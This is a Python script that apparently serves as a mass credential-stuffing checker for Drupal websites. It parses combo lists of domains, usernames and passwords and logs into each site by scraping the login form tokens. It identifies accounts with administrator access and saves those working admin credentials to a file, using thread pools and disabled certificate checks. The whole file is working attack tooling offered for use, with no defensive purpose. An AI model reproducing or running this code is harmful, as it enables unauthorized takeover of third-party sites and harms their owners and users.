import requests
import sys
import re
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, init

init(autoreset=True)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def parse_account(line):
    try:
        line = line.strip()
        if "#" in line and "@" in line:
            domain, creds = line.split("#", 1)
            user, passwd = creds.split("@", 1)
        elif "|" in line:
            parts = line.split("|")
            if len(parts) == 3:
                if "." in parts[2]:
                    user, passwd, domain = parts
                else:
                    domain, user, passwd = parts
            else:
                raise ValueError("INVALID FORMAT")
        elif ":" in line:
            parts = line.split(":")
            if len(parts) == 3:
                if "." in parts[2]:
                    user, passwd, domain = parts
                else:
                    domain, user, passwd = parts
            elif len(parts) == 2 and " " in parts[1]:
                user, tail = parts
                passwd, domain = tail.split(" ", 1)
            else:
                raise ValueError("INVALID FORMAT")
        elif ";" in line:
            parts = line.split(";")
            if len(parts) == 3:
                user, passwd, domain = parts
            else:
                raise ValueError("INVALID FORMAT")
        else:
            raise ValueError("INVALID FORMAT")

        if not domain.startswith("http"):
            domain = "https://" + domain

        return domain.rstrip("/"), user.strip(), passwd.strip()
    except Exception as e:
        raise ValueError(f"{line} - {e}")

def is_drupal_site(domain):
    try:
        r = requests.get(domain, timeout=10, verify=False)
        return "/core/" in r.text or "Drupal" in r.text
    except:
        return False

def try_login_drupal(domain, username, password):
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    try:
        login_page = session.get(f"{domain}/user/login", timeout=15, verify=False)
        if "/core/" not in login_page.text and "Drupal" not in login_page.text:
            return session, False

        form_build_id = re.search(r'name="form_build_id"\s+value="([^"]+)"', login_page.text)
        form_id = re.search(r'name="form_id"\s+value="([^"]+)"', login_page.text)

        if not form_build_id or not form_id:
            return session, False

        payload = {
            "name": username,
            "pass": password,
            "form_build_id": form_build_id.group(1),
            "form_id": form_id.group(1),
            "op": "Log in"
        }

        r = session.post(f"{domain}/user/login", data=payload, timeout=15, verify=False, allow_redirects=True)
        if "/user/logout" in r.text or "Log out" in r.text:
            return session, True
    except:
        return session, False

    return session, False

def check_admin(session, domain):
    try:
        r = session.get(f"{domain}/admin/content", timeout=15, verify=False)
        return "Add content" in r.text or "admin/content" in r.url
    except:
        return False

def process_account(line):
    try:
        domain, user, passwd = parse_account(line)

        if not is_drupal_site(domain):
            print(f"{Fore.LIGHTCYAN_EX}[{Fore.MAGENTA}NOT DRUPAL{Fore.LIGHTCYAN_EX}] {Fore.WHITE}-- {domain}")
            return

        session, logged_in = try_login_drupal(domain, user, passwd)
        if logged_in:
            if check_admin(session, domain):
                print(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}ADMIN{Fore.LIGHTCYAN_EX}] {Fore.WHITE}-- {domain} | {user}:{passwd}")
                open("admindrupal.txt", "a", encoding="utf-8").write(f"{domain}|{user}|{passwd}\n")
            else:
                print(f"{Fore.LIGHTCYAN_EX}[{Fore.YELLOW}USER{Fore.LIGHTCYAN_EX}] {Fore.WHITE}-- {domain} | {user}:{passwd}")
        else:
            print(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}FAIL{Fore.LIGHTCYAN_EX}] {Fore.WHITE}-- {domain} | {user}:{passwd}")
            open("error.txt", "a", encoding="utf-8").write(line.strip() + "\n")
    except ValueError as ve:
        print(f"{Fore.RED}[INVALID FORMAT] {ve}")
        open("invalid_format.txt", "a", encoding="utf-8").write(line.strip() + "\n")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {line.strip()} - {e}")
        open("error.txt", "a", encoding="utf-8").write(line.strip() + "\n")

if __name__ == "__main__":
    try:
        list_path = input(f"{Fore.WHITE} Your Drupal List : ").strip()
        thread_count = int(input(f"{Fore.WHITE} Thread : ").strip())
        with open(list_path, "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip()]
        pool = ThreadPool(thread_count)
        pool.map(process_account, lines)
        pool.close()
        pool.join()
        print(f"\n{Fore.LIGHTGREEN_EX}Selesai.")
    except KeyboardInterrupt:
        print(f"\n{Fore.LIGHTRED_EX}Dibatalkan oleh pengguna.")
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}Gagal: {e}")
